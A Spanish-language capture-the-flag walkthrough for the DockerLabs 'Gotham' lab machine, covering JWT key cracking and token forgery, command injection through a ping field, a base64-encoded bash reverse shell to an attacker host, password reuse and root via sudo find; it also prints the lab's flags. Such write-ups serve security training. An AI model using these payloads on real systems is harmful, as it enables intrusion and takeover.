---
icon: flag
layout:
  width: default
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
  metadata:
    visible: true
  tags:
    visible: true
  actions:
    visible: true
---

# Gotham DockerLabs (Easy)

# Contexto de la maquina
## Trayectoria Gotham

<figure><img src="../../.gitbook/assets/trayectoria_8bd055caa3.png" alt=""><figcaption></figcaption></figure>

## Descripción

**Gotham** es una máquina Linux de dificultad **Easy** en DockerLabs que simula la red interna de Gotham City. La cadena de compromiso encadena cuatro vulnerabilidades distintas para comprometer el sistema desde la página de login hasta `root`.

El acceso inicial parte de unas credenciales de invitado hardcodeadas en un comentario HTML del código fuente. Dentro de la sesión como invitado, la cookie de sesión es un **JWT** firmado con una clave débil crackeable por diccionario. Con la clave extraída se genera un token falsificado con rol `admin`, dando acceso al panel de administración. Allí hay una herramienta de diagnóstico de red que ejecuta un `ping` sin sanitización, lo que permite un **Command Injection** para obtener shell como `www-data`. En el directorio de la aplicación, el archivo `config.php` contiene en texto plano la contraseña de `bruce`, con quien escalamos. Finalmente, `bruce` tiene permiso `sudo` para ejecutar `find` sin contraseña, lo que permite escalar a `root` con una sola instrucción.

**Objetivo**

- Encontrar las credenciales de invitado en el código fuente.
- Crackear la clave del JWT y generar un token de administrador falsificado.
- Explotar el Command Injection en el panel de administración para obtener shell como `www-data`.
- Extraer la contraseña de `bruce` desde `config.php`.
- Escalar a `root` abusando del permiso `sudo find`.

**Tipo de máquina**

- Plataforma: DockerLabs
- Sistema operativo: Linux (Ubuntu)
- Categoría principal: Web / Linux Privilege Escalation
- Componentes involucrados:
    - Credenciales hardcodeadas en comentario HTML.
    - JWT firmado con clave débil crackeable con `jwt_tool`.
    - Falsificación de JWT con rol `admin`.
    - Command Injection en herramienta de ping sin sanitización.
    - Contraseña de base de datos en texto plano en `config.php`.
    - Escalada a `root` mediante `sudo find`.
## Análisis de vulnerabilidades

<figure><img src="../../.gitbook/assets/carta_Credenciales_de_cuenta_de_invi_1785922449410.png" alt=""><figcaption></figcaption></figure>
<figure><img src="../../.gitbook/assets/carta_JWT_firmado_con_clave_d_bil_cr_1785922609721.png" alt=""><figcaption></figcaption></figure>
<figure><img src="../../.gitbook/assets/carta_Command_Injection_en_herramien_1785922450305.png" alt=""><figcaption></figcaption></figure>
<figure><img src="../../.gitbook/assets/carta_Contrase_a_de_mantenimiento_en_1785922450851.png" alt=""><figcaption></figcaption></figure>
<figure><img src="../../.gitbook/assets/carta_Escalada_de_privilegios_median_1785922451390.png" alt=""><figcaption></figcaption></figure>

## Instalación

Cuando obtenemos el `.zip` lo pasamos al entorno de trabajo y lo descomprimimos:

```shell
unzip gotham.zip
```

Montamos la máquina con el script de despliegue automático de DockerLabs:

```shell
bash auto_deploy.sh gotham.tar
```

Respuesta:

```
Máquina desplegada, su dirección IP es --> 172.17.0.2

Presiona Ctrl+C cuando termines con la máquina para eliminarla
```

Cuando terminemos le damos a `Ctrl+C` para eliminar el contenedor y no dejar archivos residuales.
# Escaneo de puertos

```shell
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn <IP>
```

```shell
nmap -sCV -p<PORTS> <IP>
```

Respuesta:

```
Starting Nmap 7.99 ( https://nmap.org ) at 2026-08-05 07:24 +0000
Nmap scan report for 172.17.0.2
Host is up (0.000031s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.15
80/tcp open  http    Apache httpd 2.4.52 ((Ubuntu))
| http-robots.txt: 2 disallowed entries
|_/dashboard.php /admin.php
|_http-title: Gotham City Network
```

Dos puertos abiertos:

- **Puerto 22** → SSH (OpenSSH 8.9p1), de momento no explotable directamente.
- **Puerto 80** → HTTP (Apache 2.4.52). El escaneo ya nos da una pista muy valiosa: el archivo `robots.txt` revela dos rutas prohibidas, `/dashboard.php` y `/admin.php`, que son exactamente las que nos interesarán más adelante.
## Acceso inicial: credenciales en el código fuente

<figure><img src="../../.gitbook/assets/vuln_Credenciales_de_cuenta_de_invi_7b973f17.png" alt=""><figcaption></figcaption></figure>

Accedemos a la página:

```
URL = http://<IP>/
```

Respuesta:

<figure><img src="../../.gitbook/assets/Pasted image 20260805092938.png" alt=""><figcaption></figcaption></figure>

Encontramos directamente un formulario de login sin opción de registro. Antes de intentar fuerza bruta, inspeccionamos el código fuente de la página (`Ctrl+U` en el navegador). En los comentarios HTML encontramos lo siguiente:

```html
<!-- TODO: remove the temporary guest:guest account before go-live -- W.E. -->`
```

Un desarrollador dejó un recordatorio para eliminar una cuenta temporal de invitado. Probamos esas credenciales en el login:

```
User: guest
Pass: guest
```

Respuesta:

<figure><img src="../../.gitbook/assets/Pasted image 20260805093716.png" alt=""><figcaption></figcaption></figure>

Funcionan. Estamos dentro del dashboard como usuario invitado.
# Análisis y crackeo del JWT

<figure><img src="../../.gitbook/assets/vuln_JWT_firmado_con_clave_débil_cr_77506c3f.png" alt=""><figcaption></figcaption></figure>

## Inspección de la cookie de sesión

Explorando la sesión, vemos que el dashboard tiene funcionalidades limitadas. La cookie de sesión es un **JWT** (JSON Web Token), un formato estándar para transmitir datos de autenticación firmados criptográficamente. Abrimos las DevTools del navegador (`F12`) → `Storage` → `Cookies` para ver su valor:

<figure><img src="../../.gitbook/assets/Pasted image 20260805094210.png" alt=""><figcaption></figcaption></figure>

Un JWT tiene tres partes separadas por puntos: `header.payload.signature`. El payload contiene los datos del usuario (nombre, rol, etc.) y la firma garantiza que no ha sido modificado. Sin embargo, si la clave de firma es débil o predecible, se puede crackear por diccionario y luego usar para falsificar tokens con cualquier payload.

Probamos primero el bypass del algoritmo `none` (eliminar la firma), pero el servidor no lo acepta. Pasamos directamente al crackeo de la clave.
## Crackeo de la clave del JWT con jwt_tool

**jwt_tool** es una herramienta especializada en auditoría de tokens JWT. El flag `-C` activa el modo de crackeo de clave por diccionario, y `-d` especifica el wordlist:

```bash
git clone https://github.com/ticarpi/jwt_tool.git
python3 jwt_tool.py '<TOKEN_JWT>' -C -d <WORDLIST>
```

Respuesta:

```
[+] batman is the CORRECT key!
You can tamper/fuzz the token contents (-T/-I) and sign it using:
python3 jwt_tool.py [options here] -S hs256 -p "batman"
```

La clave de firma del JWT es `batman`, una palabra que aparece en cualquier diccionario básico. Esto confirma que el sistema es vulnerable a falsificación de tokens.
## Generación del JWT falsificado con rol admin

Con la clave conocida, generamos un nuevo token en el que cambiamos `user: guest` por `user: admin` y `role: user` por `role: admin`. El flag `-T` activa el modo de manipulación interactivo y `-S hs256 -p "batman"` firma el resultado con la clave crackeada:

```bash
python3 jwt_tool.py '<TOKEN_JWT>' -T -S hs256 -p "batman"
```

La herramienta nos presenta un menú interactivo donde modificamos los valores:

```
Token payload values:
[1] user = "guest"   → cambiamos a "admin"
[2] role = "user"    → cambiamos a "admin"
```

Resultado:

```
[+] eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiYWRtaW4iLCJyb2xlIjoiYWRtaW4iLCJpYXQiOjE3ODU5MTU4Nzd9.3tCgBHz327gaRhJz_c9js7hc_lWJ071d74n1TTNDiSg
```
## Sustitución de la cookie en el navegador

En las DevTools (`F12`) → `Storage` → `Cookies`, reemplazamos el valor actual de la cookie JWT por el token recién generado:

<figure><img src="../../.gitbook/assets/Pasted image 20260805095703.png" alt=""><figcaption></figcaption></figure>
# Escalate user www-data

<figure><img src="../../.gitbook/assets/vuln_Command_Injection_en_herramien_f855dfdb.png" alt=""><figcaption></figcaption></figure>

## Acceso al panel de administrador

Recargamos la página con la cookie falsificada:

<figure><img src="../../.gitbook/assets/Pasted image 20260805095650.png" alt=""><figcaption></figcaption></figure>

El servidor acepta el token como válido y nos da acceso como `admin`. Accedemos al panel de administración en `/admin.php`:

<figure><img src="../../.gitbook/assets/Pasted image 20260805095929.png" alt=""><figcaption></figcaption></figure>
## Identificación y explotación del Command Injection

El panel incluye una herramienta de diagnóstico de conectividad de red que ejecuta un `ping` sobre la IP introducida. Este tipo de campos es un vector clásico de **Command Injection**: si el servidor construye el comando del sistema concatenando directamente la entrada del usuario sin sanitizar, podemos añadir comandos adicionales usando el separador `;`.

Probamos con un payload simple:

```
127.0.0.1;id
```

Respuesta:

<figure><img src="../../.gitbook/assets/Pasted image 20260805100111.png" alt=""><figcaption></figcaption></figure>

El servidor ejecuta ambos comandos (`ping` e `id`) y muestra ambos resultados. No hay ningún tipo de filtrado ni sanitización, lo que confirma el Command Injection.
## Obtención de la reverse shell

Codificamos el payload de reverse shell en Base64 para evitar que los caracteres especiales (`>`, `&`) sean interpretados incorrectamente por el shell del servidor:

```bash
echo 'bash -i >& /dev/tcp/<IP_ATTACKER>/<PORT_ATTACKER> 0>&1' | base64
```

Respuesta:

```
YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjUuMTMxLzc3NzcgMD4mMQ==
```

Nos ponemos a la escucha:

```bash
nc -lvnp <PORT>
```

Enviamos el payload en el campo del ping:

```
127.0.0.1;echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjUuMTMxLzc3NzcgMD4mMQ==|base64 -d|bash
```

Si volvemos donde tenemos la escucha:

```
listening on [any] 7777 ...
connect to [192.168.5.131] from (UNKNOWN) [172.17.0.2] 50894
www-data@4d6e21decac7:/var/www/html$ whoami
www-data
```

Tenemos shell como `www-data`. Sanitizamos la TTY.
## Sanitizacion shell (TTY)

La shell obtenida a través de una reverse shell suele ser muy limitada: no tiene autocompletado, no permite usar atajos de teclado como `Ctrl+C` sin matar la sesión, y en general es bastante incómoda. Por eso realizamos el siguiente proceso para convertirla en una TTY completamente interactiva:

```shell
script /dev/null -c bash
```

```shell
# Suspendemos el proceso con Ctrl+Z
# <Ctrl> + <z>
stty raw -echo; fg
reset xterm
export TERM=xterm
export SHELL=/bin/bash

# Consultamos las dimensiones de nuestra terminal local
stty size

# Ajustamos las dimensiones de la shell remota para que coincidan
stty rows <ROWS> columns <COLUMNS>
```
# Escalate user bruce

<figure><img src="../../.gitbook/assets/vuln_Contraseña_de_mantenimiento_en_c2d5620b.png" alt=""><figcaption></figcaption></figure>

## Extracción de credenciales desde config.php

Listamos los archivos del directorio actual de la aplicación web:

```bash
ls -la /var/www/html/
```

Entre los archivos de la aplicación hay un `config.php`. Los archivos de configuración de aplicaciones PHP son siempre candidatos a contener credenciales en texto plano:

```bash
cat config.php
```

Respuesta:

```php
<?php
// config.php — Gotham City Network (internal)
$DB_HOST = '127.0.0.1';
$DB_USER = 'gothamdb';
$DB_PASS = 'Arkh4m_Kn1ght!';   // NOTE(W.E.): misma clave usada en la cuenta de mantenimiento

// Secreto de firma de sesiones (rotar trimestralmente)
$JWT_SECRET = 'batman';

// Cuentas de la aplicación
$USERS = [
    'guest' => ['pass' => 'guest', 'role' => 'user'],
];
?>
```

Dos hallazgos importantes:

- `$JWT_SECRET = 'batman'` confirma la clave que ya habíamos crackeado.
- `$DB_PASS = 'Arkh4m_Kn1ght!'` con el comentario `misma clave usada en la cuenta de mantenimiento`, que apunta directamente a que el usuario del sistema `bruce` reutiliza esa contraseña.

```bash
su bruce
# Contraseña: Arkh4m_Kn1ght!
```

Respuesta:

```
bruce@4d6e21decac7:/var/www/html$ whoami
bruce
```

Somos `bruce`. Leemos la flag del usuario:

> user.txt

```
d1f4a9c0b7e35628af1029384756bcde
```
# Escalate Privileges

<figure><img src="../../.gitbook/assets/vuln_Escalada_de_privilegios_median_b6619a1f.png" alt=""><figcaption></figcaption></figure>

## Enumeración de permisos sudo

```bash
sudo -l
```

Respuesta:

```
User bruce may run the following commands on 4d6e21decac7:
    (root) NOPASSWD: /usr/bin/find
```

`bruce` puede ejecutar `/usr/bin/find` como `root` sin contraseña. La herramienta `find` tiene la opción `-exec` que ejecuta un comando por cada resultado encontrado. Al correr como `root`, ese comando heredará los privilegios de `root`. Con `-quit` le indicamos que pare tras el primer resultado para no lanzar múltiples shells:

```bash
sudo find . -exec /bin/bash \; -quit
```

Respuesta:

```
root@4d6e21decac7:/home/bruce# whoami
root
```

Ya somos `root`. Leemos la flag final:

> root.txt

```
a7e2c9f81b6d40539e8170264fbac3d5
```

